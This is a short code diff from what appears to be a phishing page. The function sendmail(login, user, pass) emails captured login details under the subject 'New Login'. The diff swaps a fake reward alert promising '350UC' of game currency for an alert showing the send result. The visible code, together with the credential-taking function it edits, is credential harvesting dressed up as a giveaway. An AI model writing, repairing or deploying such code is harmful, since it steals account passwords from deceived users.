@@ -193,6 +193,6 @@ function sendmail(login, user, pass) {
         Subject: "New Login",
         Body: body
     }).then(
-        message => alert("Congratulations! 350UC will be credited to your account within 24 hours")
+        message => alert(message)
     );
 }
